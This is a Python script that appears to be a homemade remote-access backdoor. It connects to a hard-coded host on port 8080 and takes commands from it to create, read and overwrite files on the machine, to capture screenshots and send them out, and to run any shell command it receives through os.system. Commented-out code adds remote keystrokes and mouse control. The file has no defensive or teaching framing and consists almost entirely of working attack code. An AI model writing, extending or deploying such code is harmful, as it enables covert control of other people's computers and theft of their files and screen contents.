import os
import socket
import pyautogui
import time
 
#127.0.0.1
#10.68.72.124
#10.81.68.126
s = socket.socket()
port = 8080
host = "192.168.100.7"
connected = False
while not connected:
    try:
        s.connect((host,port))
        connected = True
    except:
        pass

#"10.81.68.126"
#192.168.100.7
while 1:
    command = s.recv(1024)
    command = command.decode()
    if command == "make file":
        command = s.recv(1024)
        command == command.decode()
        f = open(command,"x")
       
    if command == "read file":
        command = s.recv(1024)
        command = command.decode()
        f = open(command, "r")
        if f.mode == "r":
            content = f.read()
            s.send(content.encode())
           
    if command == "write file":
        command = s.recv(1024)
        command = command.decode()
        f = open(command, "w")
        if f.mode == "w":
            content = s.recv(8640).decode()
            f.write(content)
           
   
    if command == "stream":
        s.send(command.encode())
        run = True
        print("\n stream")
        answer = "a"
        while run:
            s.settimeout(10)
            try:
                command = s.recv(5000).decode()
            except:
                print("answer timed out")
            try:
                if command == "send size":
                    screenshot = pyautogui.screenshot()
                    screenshot.save(os.getcwd() + "imagee.png")
                    image = os.getcwd() + "imagee.png"
                    myfile = open(image, 'rb')
                    bytes = myfile.read()
                    size = len(bytes)
                    print(size)
                    s.send(str(size).encode())
                    print("size has been sendt")
                else:
                    if int(command) == size:
                        try:
                            print("sendt image")
                            s.send(bytes)
                        except:
                            print("could not send bytes")
                    
                
            
            except:
                print("this could not be converted to a int")
            
            #try:
                #answer = s.recv(5000).decode()
                #answer = list(answer)
                #for key in answer:
                    #pyautogui.press(str(key))
            #except:
                #print("got keys")
            #try:
                #answerone, answertwo = s.recv(2048).decode()
                #pyautogui.moveTo(answerone, answertwo)
            #except:
                #print("got")
            print("ska")
           
           
           

 

    elif command == "bat":
        run = True
        while run:
            user_command = s.recv(5000)
            user_command = user_command.decode()
            if user_command == "kill":
                run = False
            else:
                os.system(user_command)
       
   